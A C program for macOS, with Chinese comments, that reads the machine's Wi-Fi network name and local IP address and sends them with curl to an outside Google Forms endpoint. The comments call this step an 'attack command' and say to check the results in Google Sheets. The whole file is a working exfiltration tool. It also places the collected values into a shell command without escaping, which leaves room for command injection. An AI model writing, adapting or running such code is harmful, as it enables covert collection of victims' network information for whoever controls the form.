#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 格式化函数：处理空格和特殊字符，确保传输不报错
void format_payload(char *str) {
    for (int i = 0; str[i] != '\0'; i++) {
        if (str[i] == '\n' || str[i] == '\r') {
            str[i] = '\0';
            break;
        }
        // URL 传输中空格是不合法的，我们换成下划线或 %20
        if (str[i] == ' ') str[i] = '_';
    }
}

int main() {
    char wifi_ssid[128] = "Disconnected";
    char ip_addr[64] = "No_IP";
    char buffer[256];
    FILE *pipe;

    printf("--- biganning ---\n");

    // 1. 抓取 Wi-Fi 名称
    pipe = popen("networksetup -getairportnetwork en0 | awk -F': ' '{print $2}'", "r");
    if (pipe) {
        if (fgets(buffer, sizeof(buffer), pipe)) {
            strcpy(wifi_ssid, buffer);
            format_payload(wifi_ssid);
        }
        pclose(pipe);
    }

    // 2. 抓取本地 IP
    pipe = popen("ipconfig getifaddr en0", "r");
    if (pipe) {
        if (fgets(buffer, sizeof(buffer), pipe)) {
            strcpy(ip_addr, buffer);
            format_payload(ip_addr);
        }
        pclose(pipe);
    }

    // 3. 构造要上传的数据载荷
    char report[512];
    sprintf(report, "[REPORT] WiFi:%s | IP:%s", wifi_ssid, ip_addr);
    printf("info %s\n", report);

    // 4. 构造攻击指令 (使用你提供的 Entry ID: 1039220814)
    char curl_cmd[2048];
    sprintf(curl_cmd, 
        "curl -s -X POST "
        "-d \"entry.1039220814=%s\" "
        "\"https://docs.google.com/forms/d/e/1FAIpQLSdhcf8ht9zI9-i44T-pUO5tHD5y0YY0dEI6ITr4oa0H7TR4zQ/formResponse\"", 
        report);

    // 5. 执行回传
    printf("doing...\n");
    int status = system(curl_cmd);

    if (status == 0) {
        printf("\n>>> ok check Google Sheets。\n");
    } else {
        printf("\n>>> false\n");
    }

    return 0;
}
